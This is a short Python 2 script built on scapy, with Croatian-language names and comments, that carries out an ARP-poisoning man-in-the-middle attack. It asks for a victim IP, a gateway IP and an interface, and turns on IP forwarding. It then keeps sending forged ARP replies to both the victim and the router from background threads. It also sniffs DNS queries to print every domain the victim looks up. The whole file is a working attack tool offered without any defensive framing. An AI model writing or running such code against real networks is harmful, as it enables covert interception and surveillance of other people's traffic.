from scapy.all import *                    
import threading
import os
import sys
 
zrtva = raw_input('Unesi IP adresu zrtve: ')
ruter = raw_input('Unesi IP adresu rutera(gateway): ')
mreza = raw_input('Unesi ime mreze: ')
 
print '\t\t\nARP poisoning mreze .. '
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #forwardanje paketa
 
def sniff_ime(paket):
                if paket.haslayer(DNS) and paket.getlayer(DNS).qr == 0:  
                        print 'Zrtva: ' + zrtva + ' trazi: ' + paket.getlayer(DNS).qd.qname  #Iz paketa uzimamo
 
 
def poison_zrtve():
        pz = ARP(pdst=zrtva, psrc=ruter)      #arp(destinacija=zrtva, izvor=ruter)
        while True:
                try:  
                       send(pz,verbose=0,inter=1,loop=1)     #slanje arp paketa
                       
                except KeyboardInterupt:                    
                         sys.exit(1)
def poison_rutera():
        pr = ARP(pdst=ruter, psrc=zrtva)      #arp(destinacija=ruter, izvor=zrtva)
        while True:
                try:
                       send(pr,verbose=0,inter=1,loop=1)
                       
                except KeyboardInterupt:
                        sys.exit(1)
 
zrtva_dretva = []
ruter_dretva = []  
 
 
while True:     #startanje dretvi za trovanje zrtve i rutera
               
        zpoison = threading.Thread(target=poison_zrtve)
        zpoison.setDaemon(True)              #daemon(true) omogucuje terminiranje dretve kad se glavna zavrsi
        zrtva_dretva.append(zpoison)
        zpoison.start()        
       
        rpoison = threading.Thread(target=poison_rutera)
        rpoison.setDaemon(True)
        ruter_dretva.append(rpoison)
        rpoison.start()
 
        paket = sniff(iface=mreza,filter='udp port 53',prn=sniff_ime)     #sniffanje paketa